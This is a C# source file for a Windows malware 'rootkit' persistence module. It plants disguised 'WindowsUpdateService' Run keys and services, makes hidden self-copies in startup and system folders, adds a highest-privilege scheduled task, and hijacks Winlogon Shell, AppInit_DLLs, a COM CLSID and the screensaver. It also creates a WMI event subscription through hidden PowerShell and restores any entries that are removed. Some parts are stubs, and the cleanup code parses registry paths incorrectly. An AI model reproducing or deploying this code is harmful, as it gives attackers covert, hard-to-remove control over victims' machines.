using System;
using System.IO;
using System.Diagnostics;
using Microsoft.Win32;
using System.Collections.Generic;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Runtime.InteropServices;

namespace XYZ.modules.rootkit
{
    public class PersistenceModule : IDisposable
    {
        private List<string> createdFiles;
        private List<string> registryKeys;
        private string scheduledTaskName;
        private bool isDisposed = false;
        private List<string> wmiEvents;

        public PersistenceModule()
        {
            createdFiles = new List<string>();
            registryKeys = new List<string>();
            wmiEvents = new List<string>();
            scheduledTaskName = "";
        }

        public void EstablishPersistence()
        {
            try
            {
                // Establish multiple persistence mechanisms
                ApplyRegistryPersistence();
                ApplyFileSystemPersistence();
                ApplyScheduledTaskPersistence();
                ApplyDriverPersistence();
                ApplyBootPersistence();
                ApplyWmiPersistence();
                ApplyAppInitPersistence();
                ApplyCOMHijacking();
                ApplyScreenSaverPersistence();
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        private void ApplyRegistryPersistence()
        {
            try
            {
                string exePath = System.Reflection.Assembly.GetEntryAssembly().Location;

                // HKCU Run key
                string hkcuKey = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
                RegistryKey hkcu = Registry.CurrentUser.OpenSubKey(hkcuKey, true);
                if (hkcu != null)
                {
                    string valueName = "WindowsUpdateService";
                    hkcu.SetValue(valueName, exePath);
                    registryKeys.Add(@"HKCU\" + hkcuKey + @"\" + valueName);
                    hkcu.Close();
                }

                // HKLM Run key
                string hklmKey = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
                RegistryKey hklm = Registry.LocalMachine.OpenSubKey(hklmKey, true);
                if (hklm != null)
                {
                    string valueName = "WindowsSystemService";
                    hklm.SetValue(valueName, exePath);
                    registryKeys.Add(@"HKLM\" + hklmKey + @"\" + valueName);
                    hklm.Close();
                }

                // Services
                string servicesKey = @"SYSTEM\CurrentControlSet\Services\WindowsUpdateService";
                RegistryKey services = Registry.LocalMachine.OpenSubKey(servicesKey, true);
                if (services == null)
                {
                    services = Registry.LocalMachine.CreateSubKey(servicesKey);
                    if (services != null)
                    {
                        services.SetValue("ImagePath", exePath);
                        services.SetValue("Start", 2); // Auto-start
                        services.SetValue("Type", 16); // Win32 own process
                        registryKeys.Add(@"HKLM\" + servicesKey);
                        services.Close();
                    }
                }
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        private void ApplyFileSystemPersistence()
        {
            try
            {
                string exePath = System.Reflection.Assembly.GetEntryAssembly().Location;
                string fileName = Path.GetFileName(exePath);

                // Startup folder
                string startupPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.Startup),
                    fileName);
                if (!File.Exists(startupPath))
                {
                    File.Copy(exePath, startupPath, true);
                    File.SetAttributes(startupPath, File.GetAttributes(startupPath) | FileAttributes.Hidden);
                    createdFiles.Add(startupPath);
                }

                // System directory
                string systemPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.System),
                    fileName);
                if (!File.Exists(systemPath))
                {
                    File.Copy(exePath, systemPath, true);
                    File.SetAttributes(systemPath, File.GetAttributes(systemPath) | FileAttributes.Hidden);
                    createdFiles.Add(systemPath);
                }

                // Temp directory
                string tempPath = Path.Combine(
                    Path.GetTempPath(),
                    fileName);
                if (!File.Exists(tempPath))
                {
                    File.Copy(exePath, tempPath, true);
                    File.SetAttributes(tempPath, File.GetAttributes(tempPath) | FileAttributes.Hidden);
                    createdFiles.Add(tempPath);
                }

                // AppData directory
                string appDataPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "Microsoft", "Windows", "Start Menu", "Programs", "Startup", fileName);
                if (!File.Exists(appDataPath))
                {
                    Directory.CreateDirectory(Path.GetDirectoryName(appDataPath));
                    File.Copy(exePath, appDataPath, true);
                    File.SetAttributes(appDataPath, File.GetAttributes(appDataPath) | FileAttributes.Hidden);
                    createdFiles.Add(appDataPath);
                }
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        private void ApplyScheduledTaskPersistence()
        {
            try
            {
                string exePath = System.Reflection.Assembly.GetEntryAssembly().Location;
                string taskName = "WindowsUpdateService";
                scheduledTaskName = taskName;

                string schtasksCommand = "/create /tn \"" + taskName + "\" /tr \"" + exePath + "\" /sc onlogon /rl highest /f";

                ProcessStartInfo psi = new ProcessStartInfo("schtasks", schtasksCommand)
                {
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };

                Process proc = Process.Start(psi);
                if (proc != null)
                {
                    proc.WaitForExit(5000); // Wait up to 5 seconds
                }
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        private void ApplyDriverPersistence()
        {
            try
            {
                // Install as a driver for kernel-level persistence
                // This would involve creating a proper driver INF file
                // and registering it with the system
                // For now, we'll create a registry entry that looks like a driver
                string driverKey = @"SYSTEM\CurrentControlSet\Services\WindowsUpdateService";
                RegistryKey driver = Registry.LocalMachine.OpenSubKey(driverKey, true);
                if (driver == null)
                {
                    driver = Registry.LocalMachine.CreateSubKey(driverKey);
                    if (driver != null)
                    {
                        string exePath = System.Reflection.Assembly.GetEntryAssembly().Location;
                        driver.SetValue("ImagePath", exePath);
                        driver.SetValue("Start", 2); // Auto-start
                        driver.SetValue("Type", 1); // Kernel driver
                        driver.SetValue("ErrorControl", 1);
                        registryKeys.Add(@"HKLM\" + driverKey);
                        driver.Close();
                    }
                }
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        private void ApplyBootPersistence()
        {
            try
            {
                // Modify boot configuration for early loading
                // This would involve modifying boot.ini or BCD
                // For now, we'll set up a registry-based boot persistence
                string bootKey = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon";
                RegistryKey boot = Registry.LocalMachine.OpenSubKey(bootKey, true);
                if (boot != null)
                {
                    string currentShell = boot.GetValue("Shell", "explorer.exe").ToString();
                    if (!currentShell.Contains("windowsService.exe"))
                    {
                        string newShell = "explorer.exe,windowsService.exe";
                        boot.SetValue("Shell", newShell);
                        registryKeys.Add(@"HKLM\" + bootKey + @"\Shell");
                    }
                    boot.Close();
                }
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        private void ApplyWmiPersistence()
        {
            try
            {
                // Apply WMI-based persistence
                string exePath = System.Reflection.Assembly.GetEntryAssembly().Location;
                
                // Create a WMI event filter and consumer
                string wmiCommand = "powershell.exe -WindowStyle Hidden -Command \"Get-WmiObject -Namespace root\\subscription -Class __EventFilter -Filter \\\"Name='WindowsUpdateFilter'\\\" | Remove-WmiObject; Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer -Filter \\\"Name='WindowsUpdateConsumer'\\\" | Remove-WmiObject; Get-WmiObject -Namespace root\\subscription -Class __FilterToConsumerBinding -Filter \\\"Filter = '__EventFilter.Name=\\\"WindowsUpdateFilter\\\"'\\\" | Remove-WmiObject; $filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{Name='WindowsUpdateFilter';EventNameSpace='root\\CimV2';QueryLanguage='WQL';Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \\\"Win32_PerfFormattedData_PerfOS_System\\\"'}; $consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{Name='WindowsUpdateConsumer';CommandLineTemplate='" + exePath + "';RunInteractively='false'}; Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$filter;Consumer=$consumer}\"";

                ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + wmiCommand)
                {
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };

                Process proc = Process.Start(psi);
                if (proc != null)
                {
                    proc.WaitForExit(10000); // Wait up to 10 seconds
                    wmiEvents.Add("WindowsUpdateFilter");
                }
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        private void ApplyAppInitPersistence()
        {
            try
            {
                // Apply AppInit_DLLs persistence
                string appInitKey = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows";
                RegistryKey appInit = Registry.LocalMachine.OpenSubKey(appInitKey, true);
                if (appInit != null)
                {
                    // Note: This is a simplified implementation - in a real scenario,
                    // you would inject a DLL that loads our executable
                    // For demonstration, we'll show how this would work in a real implementation
                    
                    // Get the current AppInit_DLLs value
                    string currentAppInit = appInit.GetValue("AppInit_DLLs", "").ToString();
                    
                    // Create a path for our persistence DLL
                    string systemDir = Environment.GetFolderPath(Environment.SpecialFolder.System);
                    string persistenceDll = Path.Combine(systemDir, "malware_persistence.dll");
                    
                    // In a real implementation, you would create this DLL to load our executable
                    // For now, we'll just update the registry to show the concept
                    
                    if (!currentAppInit.Contains("malware_persistence.dll"))
                    {
                        string newAppInit = string.IsNullOrEmpty(currentAppInit) ? 
                            persistenceDll : 
                            currentAppInit + "," + persistenceDll;
                            
                        appInit.SetValue("AppInit_DLLs", newAppInit);
                        appInit.SetValue("LoadAppInit_DLLs", 1); // Enable AppInit_DLLs loading
                        
                        registryKeys.Add(@"HKLM\" + appInitKey + @"\AppInit_DLLs");
                    }
                    
                    appInit.Close();
                }
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        private void ApplyCOMHijacking()
        {
            try
            {
                // Apply COM hijacking persistence
                string exePath = System.Reflection.Assembly.GetEntryAssembly().Location;
                
                // Hijack a common COM object
                string comKey = @"SOFTWARE\Classes\CLSID\{42aedc87-3e76-4f06-8a0c-4b6d1b6b0f3c}\InprocServer32";
                RegistryKey com = Registry.CurrentUser.CreateSubKey(comKey);
                if (com != null)
                {
                    com.SetValue("", exePath);
                    com.SetValue("ThreadingModel", "Apartment");
                    registryKeys.Add(@"HKCU\" + comKey);
                    com.Close();
                }
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        private void ApplyScreenSaverPersistence()
        {
            try
            {
                // Apply screen saver persistence
                string exePath = System.Reflection.Assembly.GetEntryAssembly().Location;
                string scrPath = Path.ChangeExtension(exePath, ".scr");
                
                // Copy executable as .scr file
                if (!File.Exists(scrPath))
                {
                    File.Copy(exePath, scrPath, true);
                    File.SetAttributes(scrPath, File.GetAttributes(scrPath) | FileAttributes.Hidden);
                    createdFiles.Add(scrPath);
                }
                
                // Set as screen saver
                string desktopKey = @"Control Panel\Desktop";
                RegistryKey desktop = Registry.CurrentUser.OpenSubKey(desktopKey, true);
                if (desktop != null)
                {
                    desktop.SetValue("SCRNSAVE.EXE", scrPath);
                    registryKeys.Add(@"HKCU\" + desktopKey + @"\SCRNSAVE.EXE");
                    desktop.Close();
                }
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        public void RemovePersistence()
        {
            try
            {
                // Remove all persistence mechanisms
                foreach (string filePath in createdFiles)
                {
                    try
                    {
                        if (File.Exists(filePath))
                        {
                            File.Delete(filePath);
                        }
                    }
                    catch (Exception)
                    {
                        // Continue with next file
                    }
                }

                foreach (string registryPath in registryKeys)
                {
                    try
                    {
                        if (registryPath.StartsWith(@"HKCU\"))
                        {
                            string[] parts = registryPath.Substring(5).Split('\\');
                            string keyPath = parts[0];
                            string valueName = parts[1];

                            RegistryKey key = Registry.CurrentUser.OpenSubKey(keyPath, true);
                            if (key != null)
                            {
                                key.DeleteValue(valueName, false);
                                key.Close();
                            }
                        }
                        else if (registryPath.StartsWith(@"HKLM\"))
                        {
                            string[] parts = registryPath.Substring(5).Split('\\');
                            string keyPath = parts[0];
                            string valueNameOrKeyPath = parts[1];

                            RegistryKey key = Registry.LocalMachine.OpenSubKey(keyPath, true);
                            if (key != null)
                            {
                                // Check if it's a value or a subkey
                                if (valueNameOrKeyPath.Contains("\\"))
                                {
                                    // It's a subkey
                                    key.DeleteSubKeyTree(valueNameOrKeyPath, false);
                                }
                                else
                                {
                                    // It's a value
                                    key.DeleteValue(valueNameOrKeyPath, false);
                                }
                                key.Close();
                            }
                        }
                    }
                    catch (Exception)
                    {
                        // Continue with next item
                    }
                }

                if (!string.IsNullOrEmpty(scheduledTaskName))
                {
                    string schtasksCommand = "/delete /tn \"" + scheduledTaskName + "\" /f";

                    ProcessStartInfo psi = new ProcessStartInfo("schtasks", schtasksCommand)
                    {
                        UseShellExecute = false,
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Hidden
                    };

                    Process proc = Process.Start(psi);
                    if (proc != null)
                    {
                        proc.WaitForExit(5000); // Wait up to 5 seconds
                    }
                }

                // Remove WMI events
                foreach (string eventName in wmiEvents)
                {
                    try
                    {
                        string wmiCommand = "powershell.exe -WindowStyle Hidden -Command \"Get-WmiObject -Namespace root\\subscription -Class __EventFilter -Filter \\\"Name='" + eventName + "'\\\" | Remove-WmiObject; Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer -Filter \\\"Name='" + eventName + "'\\\" | Remove-WmiObject; Get-WmiObject -Namespace root\\subscription -Class __FilterToConsumerBinding -Filter \\\"Filter = '__EventFilter.Name=\\\"" + eventName + "\\\"'\\\" | Remove-WmiObject\"";

                        ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + wmiCommand)
                        {
                            UseShellExecute = false,
                            CreateNoWindow = true,
                            WindowStyle = ProcessWindowStyle.Hidden
                        };

                        Process proc = Process.Start(psi);
                        if (proc != null)
                        {
                            proc.WaitForExit(5000); // Wait up to 5 seconds
                        }
                    }
                    catch (Exception)
                    {
                        // Continue with next event
                    }
                }
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        // Implement IDisposable
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (!isDisposed)
            {
                if (disposing)
                {
                    // Dispose managed resources
                    RemovePersistence();
                }

                // Free unmanaged resources
                isDisposed = true;
            }
        }

        ~PersistenceModule()
        {
            Dispose(false);
        }

        // Method to get all created files
        public List<string> GetCreatedFiles()
        {
            return new List<string>(createdFiles);
        }

        // Method to get all registry keys
        public List<string> GetRegistryKeys()
        {
            return new List<string>(registryKeys);
        }

        // Method to check if persistence is established
        public bool IsPersistenceEstablished()
        {
            // Simple check - in a real implementation, you would verify each persistence method
            return createdFiles.Count > 0 || registryKeys.Count > 0;
        }

        // Method to re-establish persistence if it's been removed
        public void ReEstablishPersistence()
        {
            try
            {
                // Check if our files still exist
                foreach (string filePath in new List<string>(createdFiles))
                {
                    if (!File.Exists(filePath))
                    {
                        // Re-create the file
                        string exePath = System.Reflection.Assembly.GetEntryAssembly().Location;
                        string fileName = Path.GetFileName(filePath);
                        
                        try
                        {
                            File.Copy(exePath, filePath, true);
                            File.SetAttributes(filePath, File.GetAttributes(filePath) | FileAttributes.Hidden);
                        }
                        catch (Exception)
                        {
                            // Remove from list if we can't recreate
                            createdFiles.Remove(filePath);
                        }
                    }
                }

                // Check if our registry keys still exist
                foreach (string registryPath in new List<string>(registryKeys))
                {
                    try
                    {
                        if (registryPath.StartsWith(@"HKCU\"))
                        {
                            string[] parts = registryPath.Substring(5).Split('\\');
                            string keyPath = parts[0];
                            string valueName = parts[1];

                            RegistryKey key = Registry.CurrentUser.OpenSubKey(keyPath, true);
                            if (key != null)
                            {
                                object value = key.GetValue(valueName);
                                if (value == null)
                                {
                                    // Re-create the registry entry
                                    string exePath = System.Reflection.Assembly.GetEntryAssembly().Location;
                                    key.SetValue(valueName, exePath);
                                }
                                key.Close();
                            }
                        }
                        else if (registryPath.StartsWith(@"HKLM\"))
                        {
                            string[] parts = registryPath.Substring(5).Split('\\');
                            string keyPath = parts[0];
                            string valueName = parts[1];

                            RegistryKey key = Registry.LocalMachine.OpenSubKey(keyPath, true);
                            if (key != null)
                            {
                                object value = key.GetValue(valueName);
                                if (value == null)
                                {
                                    // Re-create the registry entry
                                    string exePath = System.Reflection.Assembly.GetEntryAssembly().Location;
                                    key.SetValue(valueName, exePath);
                                }
                                key.Close();
                            }
                        }
                    }
                    catch (Exception)
                    {
                        // Continue with next item
                    }
                }
            }
            catch (Exception)
            {
                // Silent fail
            }
        }
    }
}